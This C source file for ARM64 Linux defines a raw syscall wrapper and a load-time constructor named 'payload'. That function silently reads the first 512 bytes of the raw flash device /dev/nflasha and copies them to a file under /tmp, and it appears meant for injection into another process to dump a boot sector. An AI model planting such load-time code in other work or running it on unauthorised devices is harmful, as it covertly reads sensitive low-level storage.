typedef unsigned long u64;
static long sc6(long n, long a, long b, long c, long d, long e, long f) {
    register long x8 asm("x8") = n;
    register long x0 asm("x0") = a;
    register long x1 asm("x1") = b;
    register long x2 asm("x2") = c;
    register long x3 asm("x3") = d;
    register long x4 asm("x4") = e;
    register long x5 asm("x5") = f;
    asm volatile("svc #0" : "+r"(x0) : "r"(x8), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5) : "memory");
    return x0;
}
#define SYS_openat 56
#define SYS_read 63
#define SYS_write 64
#define SYS_close 57
#define AT_FDCWD (-100)
__attribute__((constructor)) static void payload(void) {
    char buf[512];
    long fd = sc6(SYS_openat, AT_FDCWD, (long)"/dev/nflasha", 0, 0, 0, 0);
    if (fd < 0) return;
    long n = sc6(SYS_read, fd, (long)buf, 512, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    long out = sc6(SYS_openat, AT_FDCWD, (long)"/tmp/jiritsu/sector0.bin", 0x241, 0644, 0, 0);
    if (out < 0) return;
    if (n > 0) sc6(SYS_write, out, (long)buf, n, 0, 0, 0);
    sc6(SYS_close, out, 0, 0, 0, 0, 0);
}
